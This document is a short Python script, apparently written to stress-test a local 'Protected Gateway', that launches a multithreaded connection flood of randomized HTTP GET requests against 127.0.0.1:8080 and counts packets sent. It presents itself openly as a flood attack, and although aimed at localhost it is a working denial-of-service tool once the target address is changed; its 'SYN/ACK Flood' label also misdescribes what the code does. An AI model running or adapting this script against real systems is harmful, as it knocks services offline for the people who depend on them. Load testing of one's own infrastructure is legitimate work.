import socket
import threading
import time
import random
import sys

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080 # The Protected Gateway

print(f"--- 🌊 STARTING REAL-TIME FLOOD ATTACK ---")
print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
print("[*] Method: TCP SYN/ACK Flood (Simulated via Connect)")
print("[!] Press CTRL+C to stop.\n")

packet_count = 0

def attack_worker():
    global packet_count
    while True:
        try:
            # Create a REAL socket connection (The OS handles the handshake)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Send junk data to force the server to process it
            payload = f"GET /?id={random.randint(1,999999)} HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"
            s.send(payload.encode('utf-8'))
            
            s.close()
            packet_count += 1
        except:
            pass # Socket errors are expected during floods

# Launch 100 concurrent threads (High Load)
for i in range(100):
    t = threading.Thread(target=attack_worker, daemon=True)
    t.start()

try:
    while True:
        sys.stdout.write(f"\r[>] Packets Sent: {packet_count}")
        sys.stdout.flush()
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\n\n[🛑] Attack Stopped.")